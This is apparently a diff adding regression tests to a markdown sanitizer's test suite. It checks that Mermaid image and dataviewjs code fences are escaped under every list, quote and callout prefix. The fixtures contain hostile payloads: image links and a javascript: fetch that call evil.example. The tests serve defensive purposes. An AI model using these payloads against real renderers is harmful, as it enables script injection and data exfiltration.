@@ -1416,6 +1416,12 @@ const R2_N1 = [
   '!javascript:x[a](https://evil.example/i.png)',
   '!![i](https://x.example/)[java](javascript:1)script:y[a](https://evil.example/i.png)'
 ];
+const MERMAID = '~~~mermaid\nflowchart TD\n  A@{ img: "https://evil.example/i.png", label: "x", pos: "t", w: 60, h: 60 }\n~~~';
+const DATAVIEW = "~~~dataviewjs\nlocation='javascript:fetch%28%22https://evil.example/%22%29'\n~~~";
+const FENCES = [];
+for (const body of [MERMAID, DATAVIEW, MERMAID.replace(/~/g, '`'), '~~~~\nx\n~~~~'])
+  for (const wrap of [l => l, l => `> ${l}`, l => `- ${l}`, l => `1. ${l}`, l => `> [!note]\n> ${l}`, l => `  ${l}`, l => `    ${l}`, l => `\t${l}`, l => `- [ ] ${l}`, l => `> - ${l}`, l => `[^1]: ${l}`])
+    FENCES.push(body.split('\n').map((l, k) => (k === 0 ? wrap(l) : wrap(l).startsWith('> [!note]') ? l : wrap(l))).join('\n'));
 const R1_HOSTILE = [
   '![a [b] c](https://evil.example/x.png?q=secret)',
   '![x]\n\n[x]: https://evil.example/i.png',
@@ -1433,6 +1439,9 @@ function assertSafe(out, label) {
   assert.doesNotMatch(b, /<[A-Za-z!\/]/, `${label}: unescaped tag in ${JSON.stringify(out)}`);
   assert.doesNotMatch(out, /<img/i, label);
   assert.doesNotMatch(b, /!\[[^\]]*\]\([^)]*evil/, `${label}: image destination`);
+  // An escaped character is literal text, so a line that starts with one is a paragraph, not a fence.
+  for (const line of out.replace(/\\[\s\S]/g, 'x').split('\n'))
+    assert.doesNotMatch(line, /^\s*(?:>\s*|[-*+]\s+|\d+[.)]\s+)*(?:~{3,}|`{3,})/, `${label}: fence opener in ${JSON.stringify(out)}`);
 }
 const through = (text, path) => {
   try {
@@ -1455,6 +1464,17 @@ const throughUnchecked = (text, path) => {
     SAVED
   ).detail;
 };
+
+test('R3-B1 fence openers (mermaid img, dataviewjs) are escaped at block level in every prefix, and the text is kept', () => {
+  for (const input of FENCES)
+    for (const path of ['detail', 'correction', 'title']) {
+      const out = through(input, path);
+      assertSafe(out, `${path} ${input}`);
+    }
+  const out = through(MERMAID, 'detail');
+  assert.match(out, /^\\~~~mermaid$/m);
+  assert.match(out, /flowchart TD/);
+});
 
 test('R2-N1 the two reported inputs: no image opener survives in the body, a correction or a footnote title', () => {
   for (const input of R2_N1)
@@ -1481,7 +1501,7 @@ test('R2-N1 invariant: every hostile input and ~240 generated combinations leave
     seed = (seed * 1103515245 + 12345) % 2147483648;
     return seed % n;
   };
-  const inputs = [...R2_N1, ...R1_HOSTILE];
+  const inputs = [...R2_N1, ...FENCES, ...R1_HOSTILE];
   while (inputs.length < 246) {
     const parts = [];
     for (let k = 0; k < 3; k++) parts.push(inserts[next(inserts.length)], nodes[next(nodes.length)]);
